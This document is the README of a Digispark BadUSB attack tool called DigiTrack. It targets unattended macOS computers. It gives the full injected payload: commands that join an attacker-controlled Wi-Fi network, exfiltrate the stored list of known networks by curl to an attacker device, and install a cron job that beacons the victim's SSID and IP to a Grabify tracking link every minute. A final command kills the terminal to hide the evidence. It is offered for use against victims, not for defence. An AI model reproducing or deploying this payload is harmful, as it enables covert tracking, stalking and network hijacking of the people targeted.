# DigiTrack

In 30 seconds, this attack can learn which networks a MacOS computer has connected to before, and plant a script that tracks the current IP address and Wi-Fi network every 60 seconds.

## Now includes: Hardtracker - Digispark VPN buster to send the IP address and BSSID/SSID of nearby Wi-Fi networks on a MacOS computer to a Grabify tracker every 60 seconds.

This is a $5 attack that does a couple things:

1) Inserts a Wi-Fi backdoor onto a victim computer, allowing you to capture the victim's data connection at any time when you are in Wi-Fi range.
2) Steals a list of every network the victim has ever connected to (for tracking, classifying, and hijacking data connection)
3) Inserts a tracking job that send the IP address and currently connected network to a Grabify link every 60 seconds.


Attack goes: A victim leaves a MacOS computer unattended for 30 seconds. The attacker inserts a DigiSpark board loaded with an attack payload. The payload looks like this (with delays and single key strokes removed):


 ### DigiKeyboard.print("networksetup -setairportnetwork en0 'sneakernet' 00000000"); 
  - We add the network "Sneakernet" to our trusted network list and connect to it.
  
###  DigiKeyboard.print("curl -m 10 --silent --output /dev/null -X POST -H \"Content-Type: text/plain\" --data \"$(networksetup -listpreferredwirelessnetworks en0)\" 192.168.4.1 &");
  - After connecting, we send a CURL request listing every single network the MacOS computer has connected to in the past to the esp8266 creating the "Sneakernet" network. The & puts the process in the background in case it takes too long, and the -m sets a timer of 10 seconds to prevent it taking too long. Now we know which Wi-Fi networks the victim has joined, and which networks will force the computer to connect without asking.
  
###  DigiKeyboard.print("export VISUAL=nano; crontab -e");
  - We create a job that will execute every 60 seconds
  
 ### DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer \"$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/ SSID/ {print substr($0, index($0, $2))}')\"  https://grabi/YOURLINK");
 - We suppress the output of CURL, and grab the network name of the currently connected Wi-Fi network. We sent this along with a CURL request to a tracking URL, delivering the target's IP address and currently connected Wi-Fi network every 60 seconds.
  
###  DigiKeyboard.print("wait && kill -9 $(ps -p $PPID -o ppid=)");
  - Finally, we wait for all background processes to finish, and kill the shit out of the terminal window to hide the evidence.

Total run time is about 30 seconds, not including the few seconds the Digisparks waits for a sketch to upload.

Notes: Grabify may go into "I'm under attack" mode and not allow checkin. Look for this line:
div class="cf-browser-verification cf-im-under-attack"
  
 If you see it, then the IP address is being blocked by cloudflare.
